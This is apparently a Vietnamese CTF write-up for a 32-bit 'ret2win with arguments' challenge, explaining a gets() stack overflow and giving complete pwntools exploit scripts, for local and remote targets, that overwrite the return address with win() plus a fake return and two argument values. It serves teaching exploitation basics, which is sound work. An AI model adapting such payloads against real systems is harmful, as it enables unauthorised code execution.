# README.md

# Buffer Overflow 3 - ret2win with Arguments

## Mục tiêu

Khai thác lỗi **Stack Buffer Overflow** để chuyển luồng thực thi sang hàm `win()` và truyền đúng hai tham số để chương trình in ra flag.

---

# Phân tích mã nguồn

Hàm dễ bị tấn công là:

```c
void vuln(){
    char buf[100];
    gets(buf);
    puts(buf);
}
```

Hàm `gets()` không kiểm tra kích thước dữ liệu nhập vào, do đó nếu nhập quá 100 byte sẽ ghi đè lên các dữ liệu phía sau trên stack, bao gồm:

- Saved EBP
- Return Address (địa chỉ trả về)

Đây là lỗ hổng **Stack Buffer Overflow**.

---

# Hàm win()

```c
void win(unsigned int arg1, unsigned int arg2)
```

Sau khi mở file `flag.txt`, chương trình kiểm tra:

```c
if (arg1 != 0xCAFEF00D)
    return;

if (arg2 != 0xF00DF00D)
    return;
```

Chỉ khi hai tham số đúng thì mới thực hiện:

```c
printf(buf);
```

để in ra flag.

---

# Ý tưởng khai thác

Thông thường chương trình sẽ gọi hàm bằng lệnh `call`.

Ví dụ:

```c
win(0xCAFEF00D, 0xF00DF00D);
```

Khi đó CPU tự động tạo bố cục stack:

```
return address
arg1
arg2
```

Tuy nhiên trong bài này ta **không đi qua lệnh `call`**.

Thay vào đó, ta lợi dụng buffer overflow để **ghi đè return address của hàm `vuln()` thành địa chỉ của `win()`**.

Khi `vuln()` kết thúc, CPU thực hiện:

```
ret
```

và nhảy thẳng vào `win()`.

Do không sử dụng `call`, stack sẽ thiếu **return address của hàm `win()`**.

Nếu payload chỉ có:

```
padding
win
arg1
arg2
```

thì `arg1` sẽ bị hiểu là return address và các tham số sẽ bị lệch vị trí.

Vì vậy cần thêm một **fake return address** để mô phỏng đúng cách `call` hoạt động.

Payload đúng sẽ là:

```
padding
win
fake_return
arg1
arg2
```

---

# Xác định offset

Sử dụng `pwntools`:

```bash
python3 -c "from pwn import *; print(cyclic(200).decode())"
```

Sau khi chương trình bị crash, dùng:

```bash
cyclic_find(...)
```

Kết quả:

```
Offset = 112
```

---

# Payload

Payload có dạng:

```
112 byte padding
+
Địa chỉ win
+
Fake return
+
0xCAFEF00D
+
0xF00DF00D
```

Ví dụ bằng pwntools:

```python
from pwn import *

elf = ELF("./vuln")

payload = (
    b"A"*112 +
    p32(elf.symbols["win"]) +
    p32(0x0) +
    p32(0xCAFEF00D) +
    p32(0xF00DF00D)
)
```

---

# Khai thác Local

```python
from pwn import *

context.binary = ELF("./vuln")

p = process("./vuln")

payload = (
    b"A"*112 +
    p32(context.binary.symbols["win"]) +
    p32(0) +
    p32(0xCAFEF00D) +
    p32(0xF00DF00D)
)

p.sendline(payload)
p.interactive()
```

---

# Khai thác Remote

```python
from pwn import *

context.binary = ELF("./vuln")

HOST = "HOST"
PORT = PORT

p = remote(HOST, PORT)

payload = (
    b"A"*112 +
    p32(context.binary.symbols["win"]) +
    p32(0) +
    p32(0xCAFEF00D) +
    p32(0xF00DF00D)
)

p.sendline(payload)
p.interactive()
```

---

# Giải thích Fake Return

Fake return **không phải để thực thi mã**.

Nó chỉ đóng vai trò là **địa chỉ trả về của hàm `win()`**, giúp bố cục stack giống hệt khi `win()` được gọi bằng `call`.

Nhờ đó:

```
[ebp+4]  -> fake return
[ebp+8]  -> arg1
[ebp+12] -> arg2
```

Hai tham số sẽ nằm đúng vị trí mà `win()` mong đợi.

---

# Kiến thức rút ra

- Hiểu cách tổ chức stack của hàm trong kiến trúc x86.
- Phân biệt sự khác nhau giữa `call` và `ret`.
- Khai thác Stack Buffer Overflow để điều khiển luồng thực thi.
- Kỹ thuật **ret2win có tham số (ret2win with arguments)**.
- Vai trò của **fake return address** trong các bài ret2win trên x86 32-bit.